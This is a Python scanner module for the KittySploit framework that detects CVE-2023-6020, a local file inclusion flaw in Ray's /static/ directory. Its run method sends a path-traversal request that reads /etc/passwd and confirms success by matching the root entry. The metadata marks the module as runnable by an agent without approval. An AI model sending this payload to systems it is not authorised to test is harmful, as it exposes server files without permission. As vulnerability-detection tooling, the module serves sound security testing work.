#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""LFI in Ray's /static/ directory allows attackers to read any file on the server without authentication."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ray Static File - Local File Inclusion Detection',
        'description': "LFI in Ray's /static/ directory allows attackers to read any file on the server without authentication.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'lfi', 'ray', 'oos', 'ray_project', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://huntr.com/bounties/83dd8619-6dc3-4c98-8f1b-e620fedcd1f6/',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-6020',
        ],
        'cve': 'CVE-2023-6020',
    }

    def run(self):
        r = self.http_request(method="GET", path='/static/js/../../../../../../../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_all = ('application/octet-stream', 'aiohttp',)
        body_regexes = ('root:.*:0:0:',)
        if (all(m in headers for m in header_all)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Ray Static File - Local File Inclusion detected",
                path='/static/js/../../../../../../../../../../../../../../etc/passwd',
            )
            return True
        return False

